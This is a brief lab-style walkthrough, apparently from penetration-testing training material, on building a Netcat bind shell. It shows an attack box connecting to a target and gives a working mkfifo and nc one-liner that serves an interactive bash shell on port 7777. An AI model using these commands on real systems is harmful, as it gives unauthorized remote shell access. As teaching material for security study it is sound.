![](bindshell.png)

* Connect with `IP address` and `port` to the target

#### No. 1: Server - Target starting Netcat listener
```sh
$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

#### No. 2: Client - Attack box connecting to target
```sh
$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

## Establishing a Basic Bind Shell with Netcat
```sh
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_ip> 7777 > /tmp/f
```

```sh
$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

